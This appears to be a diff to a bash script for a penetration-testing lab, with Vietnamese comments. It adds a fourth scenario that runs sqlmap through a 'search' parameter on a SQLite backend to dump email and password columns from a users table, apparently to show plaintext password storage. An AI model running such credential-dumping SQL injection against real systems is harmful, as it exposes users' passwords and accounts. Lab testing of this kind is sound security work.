@@ -61,6 +61,16 @@ $SQLMAP_CMD -r "$REQ_FILE" -p search --dbms=SQLite --batch --tables > "$LOG_DIR/
 echo "[✔] Hoàn tất Kịch bản 3. Log lưu tại: $LOG_DIR/scenario_3_raw_request.log"
 
 echo ""
+echo "----------------------------------------------------------------------"
+echo " [KỊCH BẢN 4 - BỔ SUNG A02] Dump bảng users trích xuất email & mật khẩu"
+echo " Chứng minh Cryptographic Failures: Mật khẩu lưu Plaintext hoàn toàn"
+echo "----------------------------------------------------------------------"
+echo "Lệnh thực thi: $SQLMAP_CMD -r \"$REQ_FILE\" -p search --dbms=SQLite --batch -T users -C email,password --dump"
+$SQLMAP_CMD -r "$REQ_FILE" -p search --dbms=SQLite --batch -T users -C email,password --dump > "$LOG_DIR/sqlmap_dump_passwords.log" 2>&1 || true
+echo "[✔] Hoàn tất Kịch bản 4. Log lưu tại: $LOG_DIR/sqlmap_dump_passwords.log"
+
+echo ""
 echo "======================================================================"
-echo " [HOÀN TẤT THỰC NGHIỆM L1] Toàn bộ log đã được lưu tại: $LOG_DIR"
+echo " [HOÀN TẤT THỰC NGHIỆM L1 & BỔ SUNG A02] Toàn bộ log đã được lưu tại: $LOG_DIR"
 echo "======================================================================"
+
